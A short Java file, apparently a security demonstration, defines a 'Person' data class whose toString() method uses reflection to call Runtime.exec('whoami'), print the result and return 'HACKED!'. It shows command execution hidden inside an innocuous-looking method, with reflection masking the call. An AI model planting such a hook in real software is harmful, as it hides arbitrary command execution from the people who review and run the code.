import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class Person {
    public String name;
    public int age;
    public int stuNo;

    @Override
    public String toString(){
        try{
            Class c = Class.forName("java.lang.Runtime");
            Method m1 = c.getDeclaredMethod("getRuntime",null);
            m1.setAccessible(true);
            Runtime runtime = (Runtime)m1.invoke(null);
//            Runtime runtime = Runtime.getRuntime();
            Method m2 = c.getDeclaredMethod("exec", String.class);
            m2.setAccessible(true);
            Process process = (Process) m2.invoke(runtime,"whoami");
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
        }
        catch(Exception e){
            e.printStackTrace();
        }
        return "HACKED!";
    }
}
